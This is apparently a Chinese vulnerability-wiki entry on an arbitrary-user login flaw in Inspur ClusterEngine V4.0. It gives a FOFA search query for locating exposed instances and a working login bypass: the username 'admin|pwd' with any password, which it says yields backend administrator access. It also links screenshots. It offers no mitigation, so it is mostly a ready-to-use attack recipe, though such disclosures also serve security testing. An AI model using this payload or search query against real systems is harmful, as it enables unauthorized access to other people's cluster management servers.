# 浪潮ClusterEngineV4.0 任意用户登录漏洞

## 漏洞描述

浪潮ClusterEngineV4.0 存在任意用户登录漏洞，构造恶意的用户名和密码即可获取后台权限

## 漏洞影响

> [!NOTE]
>
> 浪潮ClusterEngineV4.0

## FOFA

> [!NOTE]
>
> title="TSCEV4.0"

## 漏洞复现

登录页面如下

![](http://wikioss.peiqi.tech/vuln/lc-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

```
USER： admin|pwd
PASS:  任意
```

成功登陆后台

> [!NOTE]
>
> 部分功能是无法使用的

![](http://wikioss.peiqi.tech/vuln/ic-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)